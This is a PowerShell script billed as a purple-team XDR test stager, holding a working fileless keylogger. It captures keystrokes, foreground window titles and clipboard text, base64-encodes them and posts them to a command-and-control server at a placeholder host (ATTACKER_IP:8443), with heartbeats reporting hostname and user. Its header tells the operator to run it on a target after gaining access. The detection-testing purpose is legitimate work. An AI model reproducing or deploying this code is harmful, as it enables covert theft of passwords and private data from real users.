<#
.SYNOPSIS
    Fileless download cradle / stager for the Windows keylogger agent.

.DESCRIPTION
    MITRE ATT&CK:
      T1105 - Ingress Tool Transfer
      T1059.001 - PowerShell
      T1027 - Obfuscated Files or Information

    Downloads and executes the agent entirely in memory.
    Run this one-liner on the target after gaining access.

    XDR detections:
      - PowerShell download cradle
      - IEX / Invoke-Expression usage
      - PowerShell making outbound HTTP request
      - In-memory script execution (no file on disk)

.PARAMETER C2Url
    The collection server URL

.PARAMETER StagerUrl
    URL hosting the agent script (can be the C2 server)
#>

param(
    [string]$C2Url    = "http://ATTACKER_IP:8443",
    [string]$AuthToken = "purpleteam-xdr-test-2024"
)

# ── Cradle: Download agent from C2 and execute in memory ────────
# Technique 1: WebClient (classic, most detected)
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("X-Auth-Token", $AuthToken)

# Technique 2: Invoke-RestMethod (modern)
# $script = Invoke-RestMethod -Uri "$C2Url/api/stager" -Headers @{"X-Auth-Token"=$AuthToken}

# For purple team: the agent is base64-encoded in this stager
# In a real scenario, it would be downloaded from the C2

Write-Host "[*] Purple Team Stager - Fileless Execution" -ForegroundColor Cyan
Write-Host "[*] MITRE: T1105 / T1059.001 / T1027" -ForegroundColor Cyan
Write-Host "[*] C2: $C2Url" -ForegroundColor Cyan

# Signal the C2 that stager executed
try {
    $body = @{
        agent_id = "$env:COMPUTERNAME-stager"
        hostname = $env:COMPUTERNAME
        pid      = $PID
        platform = "Windows"
        user     = "$env:USERDOMAIN\$env:USERNAME"
        method   = "fileless-stager"
    } | ConvertTo-Json

    Invoke-RestMethod -Uri "$C2Url/api/heartbeat" -Method POST -Body $body `
        -ContentType "application/json" -Headers @{"X-Auth-Token" = $AuthToken} `
        -TimeoutSec 10 -ErrorAction SilentlyContinue
    Write-Host "[+] C2 check-in successful" -ForegroundColor Green
} catch {
    Write-Host "[!] C2 unreachable: $_" -ForegroundColor Red
}

# ── Inline keylogger (fileless variant) ─────────────────────────
# Simplified version that runs entirely in memory without writing to disk

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class KL {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    public static string WinTitle() {
        var s = new StringBuilder(256);
        GetWindowText(GetForegroundWindow(), s, 256);
        return s.ToString();
    }
}
"@

Add-Type -AssemblyName System.Windows.Forms

$buf = [System.Collections.ArrayList]::new()
$lastClip = ""
$exfilWatch = [System.Diagnostics.Stopwatch]::StartNew()
$hbWatch    = [System.Diagnostics.Stopwatch]::StartNew()
$agentId    = "$env:COMPUTERNAME-$(Get-Random -Max 0xFFFF)"

function Send-Data($ep, $data) {
    try {
        $j = $data | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$C2Url$ep" -Method POST -Body $j `
            -ContentType "application/json" `
            -Headers @{"X-Auth-Token"=$AuthToken} `
            -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Map-Key([int]$vk, [bool]$sh) {
    switch ($vk) {
        8  { "[BKSP]" } 9  { "[TAB]" } 13 { "[ENTER]" } 32 { " " }
        {$_ -ge 48 -and $_ -le 57} {
            $s = @(")",  "!", "@", "#", "`$", "%", "^", "&", "*", "(")
            if ($sh) { $s[$vk-48] } else { [char]$vk }
        }
        {$_ -ge 65 -and $_ -le 90} {
            if ($sh) { [char]$vk } else { [char]($vk+32) }
        }
        default { $null }
    }
}

Write-Host "[*] Keylogger active (fileless). Ctrl+C to stop." -ForegroundColor Yellow

while ($true) {
    Start-Sleep -Milliseconds 10

    $shift = ([KL]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0
    for ($k = 8; $k -le 90; $k++) {
        if (([KL]::GetAsyncKeyState($k) -band 1) -eq 1) {
            $c = Map-Key $k $shift
            if ($c) { [void]$buf.Add($c) }
        }
    }

    # Clipboard check every ~5s
    if ($exfilWatch.Elapsed.TotalSeconds % 5 -lt 0.02) {
        try {
            $clip = [System.Windows.Forms.Clipboard]::GetText()
            if ($clip -and $clip -ne $lastClip) {
                $lastClip = $clip
                $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($clip))
                Send-Data "/api/clipboard" @{ agent_id=$agentId; content=$enc; encoding="base64" }
            }
        } catch {}
    }

    # Exfil keystrokes every 15s
    if ($exfilWatch.Elapsed.TotalSeconds -ge 15 -and $buf.Count -gt 0) {
        $keys = $buf -join ""
        $buf.Clear()
        $exfilWatch.Restart()
        $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($keys))
        $win = [KL]::WinTitle()
        Send-Data "/api/keystrokes" @{
            agent_id=$agentId; keystrokes=$enc; encoding="base64"
            window_title=$win; count=$keys.Length
        }
        Write-Host "[$((Get-Date).ToString('HH:mm:ss'))] Exfil $($keys.Length) keys" -ForegroundColor DarkGray
    }

    # Heartbeat every 30s
    if ($hbWatch.Elapsed.TotalSeconds -ge 30) {
        Send-Data "/api/heartbeat" @{
            agent_id=$agentId; hostname=$env:COMPUTERNAME
            pid=$PID; platform="Windows"; user=$env:USERNAME
        }
        $hbWatch.Restart()
    }
}
